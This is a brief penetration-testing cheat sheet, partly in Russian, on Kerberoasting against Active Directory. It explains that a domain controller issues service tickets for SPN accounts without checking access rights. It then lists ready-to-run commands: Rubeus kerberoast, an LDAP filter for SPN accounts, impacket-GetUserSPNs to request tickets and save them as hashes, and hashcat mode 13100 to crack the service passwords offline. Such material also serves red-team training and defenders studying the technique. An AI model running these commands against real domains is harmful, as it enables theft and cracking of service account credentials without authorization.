# KERBEROASTING

### **Условие для проведения атаки**:

Учетная запись в домене с присвоенный SPN атрибутом.

Атакующий отправляет KRB\_TGS\_REQ сообщения с указанием SPN, ассоциированными с выявленными учетными записями. Контроллер домена не занимается авторизацией, то есть не проверяет имеет ли скомпрометированная учетная запись право доступа к запрашиваемым сервисам, (так как для выдачи TGS пользователю достаточно предоставить свой TGT) поэтому в ответ отправляются сообщения, содержащие TGS билеты, зашифрованные с использованием секретов сервисов. Таким образом, получив TGS-билеты, атакующий может попробовать подобрать пароль к сервисам по словарю оффлайн.

### Abuse

```powershell
Rubeus.exe kerberoast /stats
```

Ldap request to search for accounts that have SPN.

```powershell
"(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))"
```

Get users with SPN and send TGS-REQ

```bash
impacket-GetUserSPNs -dc-ip $DC_IP $Domain_FQDN/$username:$password -request -outputfile $file
```



### Brute

```bash
hashcat -m 13100 $kerberos_hashes $dictionary
```
